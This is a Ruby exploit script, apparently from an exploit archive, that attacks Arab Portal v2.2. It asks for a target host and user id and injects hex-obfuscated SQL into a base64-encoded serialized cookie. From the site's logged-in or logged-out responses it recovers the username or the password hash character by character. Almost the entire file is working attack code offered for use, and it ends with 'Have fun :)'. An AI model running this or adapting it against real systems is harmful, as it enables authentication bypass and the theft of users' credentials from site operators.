#!/usr/bin/ruby

#=============================================#
#          Arab Portal v2.2 Exploit           #,
# Blind SQL Injection / Authentication Bypass #
#  Discovered & written by: Jafer Al-Zidjali  #
#         Email: jafer@scorpionds.com         #
#         Website: www.scorpionds.com         #
#=============================================#

require "net/http"
require "base64"

intro=[
          "+=============================================+",
          "+          Arab Portal v2.2 Exploit           +",
          "+ Blind SQL Injection / Authentication Bypass +",
          "+  Discovered & written by: Jafer Al-Zidjali  +",
          "+         Email: jafer@scorpionds.com         +",
          "+         Website: www.scorpionds.com         +",
          "+=============================================+"
          ]

def print_intro text
  w="|"
  text.each do |str|
    str.scan(/./) do |c|
        STDOUT.flush
      if w=="|" 
        print "\b"+c +w
        w="/"
      elsif w=="/" 
        print "\b"+c +w
        w="-"  
      elsif w=="-" 
        print "\b"+c +w
        w="\\" 
      else
      print "\b"+c +w
      w="|"
      end
      sleep 0.05
    end
    print "\b "
    puts ""
  end
end

print_intro intro

puts "\nEnter host name (e.g. example.com):"
host=gets.chomp

puts "\nEnter script path (e.g. /arabportal/):"
path=gets.chomp

puts "\nEnter userid:"
userid=gets.chomp

puts "\nGetting cookie value..."

http = Net::HTTP.new(host, 80)

resp= http.get(path)
cookie = resp.response["set-cookie"]

len=cookie.split("; ").length
max=0
login_info=""

len.times do |count|
  clen=cookie.split("; ")[count].length
    if clen > max then 
      max=clen 
      login_info=cookie.split("; ")[count]
    end
end

login_info=login_info.split(", ")

if login_info[0].length > login_info[1].length
login_info=login_info[0]
else
login_info=login_info[1]
end

login_info=login_info.split("=")[0]

puts "Cookie name is: "+login_info

puts "\nWhat do you want to do?"
puts "1. Get username."
puts "2. Get password hash."

opt=gets.chomp

if opt=="1"
  unamelen=0
  print "\nGetting username length"

  20.times do |x|
    stmt="#{userid}"+
                    "\x27\x20\x61\x6e\x64\x20\x6c"+
                    "\x65\x6e\x67\x74\x68\x28\x75"+
                    "\x73\x65\x72\x6e\x61\x6d\x65"+
                    "\x29\x3d#{x}\x20\x6f\x72\x20\x27\x27\x3d\x27"

    shellcode="\x61\x3a\x35\x3a\x7b\x69\x3a\x30"+
              "\x3b\x73\x3a\x31\x30\x3a\x22\x61"+
              "\x72\x61\x62\x70\x6f\x72\x74\x61"+
              "\x6c\x22\x3b\x69\x3a\x31\x3b\x69"+
              "\x3a\x31\x3b\x69\x3a\x32\x3b\x73\x3a"+
              stmt.length.to_s+
              "\x3a\x22"+
              stmt+
              "\x22\x3b\x69\x3a\x33\x3b\x69\x3a"+
              "\x30\x3b\x69\x3a\x34\x3b\x73\x3a"+
              "\x31\x3a\x22\x61\x22\x3b\x7d"

    header={
                  "Cookie" => login_info+"="+Base64.encode64(shellcode).gsub(/\s/,"")
    }

    resp= http.get(path,header)
    if resp.body =~ /action=logout/
      puts "\nLength is: #{x}"
      unamelen=x
      break
    else
        print "."
        STDOUT.flush
    end
  end 

  chars="abcdefghijklmnopqrstuvwxyz0123456789"

  print "\nGetting username: "
  unamelen.times do |z|
    chars.scan(/./) do |c|
        stmt="#{userid}"+
                        "\x27\x20\x61\x6e\x64\x20\x73"+
                        "\x75\x62\x73\x74\x72\x69\x6e"+
                        "\x67\x28\x75\x73\x65\x72\x6e"+
                        "\x61\x6d\x65\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27\x20\x6f\x72\x20\x27\x27\x3d\x27"

        shellcode="\x61\x3a\x35\x3a\x7b\x69\x3a\x30"+
                  "\x3b\x73\x3a\x31\x30\x3a\x22\x61"+
                  "\x72\x61\x62\x70\x6f\x72\x74\x61"+
                  "\x6c\x22\x3b\x69\x3a\x31\x3b\x69"+
                  "\x3a\x31\x3b\x69\x3a\x32\x3b\x73\x3a"+
                  stmt.length.to_s+
                  "\x3a\x22"+
                  stmt+
                  "\x22\x3b\x69\x3a\x33\x3b\x69\x3a"+
                  "\x30\x3b\x69\x3a\x34\x3b\x73\x3a"+
                  "\x31\x3a\x22\x61\x22\x3b\x7d"

        header={
                      "Cookie" => login_info+"="+Base64.encode64(shellcode).gsub(/\s/,"")
        }
        print c
        STDOUT.flush
        http = Net::HTTP.new(host, 80)
        resp= http.get(path,header)
        if resp.body =~ /action=logout/
          break
        end
        print "\b"
    end
  end
  puts "\nHave fun :)"

elsif opt=="2"
  chars="0123456789abcdef"

  print "\nGetting password hash: "
  32.times do |z|
    chars.scan(/./) do |c|
        stmt="#{userid}"+
                        "\x27\x20\x61\x6e\x64\x20\x73\x75"+
                        "\x62\x73\x74\x72\x69\x6e\x67\x28"+
                        "\x70\x61\x73\x73\x77\x6f\x72\x64"+
                        "\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27"+
                        "\x20\x6f\x72\x20\x27\x27\x3d\x27" 
        shellcode="\x61\x3a\x35\x3a\x7b\x69\x3a\x30"+
                  "\x3b\x73\x3a\x31\x30\x3a\x22\x61"+
                  "\x72\x61\x62\x70\x6f\x72\x74\x61"+
                  "\x6c\x22\x3b\x69\x3a\x31\x3b\x69"+
                  "\x3a\x31\x3b\x69\x3a\x32\x3b\x73\x3a"+
                  stmt.length.to_s+
                  "\x3a\x22"+
                  stmt+
                  "\x22\x3b\x69\x3a\x33\x3b\x69\x3a"+
                  "\x30\x3b\x69\x3a\x34\x3b\x73\x3a"+
                  "\x31\x3a\x22\x61\x22\x3b\x7d"
        header={
                      "Cookie" => login_info+"="+Base64.encode64(shellcode).gsub(/\s/,"")
        }
        print c
        STDOUT.flush
        http = Net::HTTP.new(host, 80)
        resp= http.get(path,header)
        if resp.body =~ /action=logout/	
          break
        end
        print "\b"
    end
  end
  puts "\nHave fun :)"
end

# milw0rm.com [2009-08-07]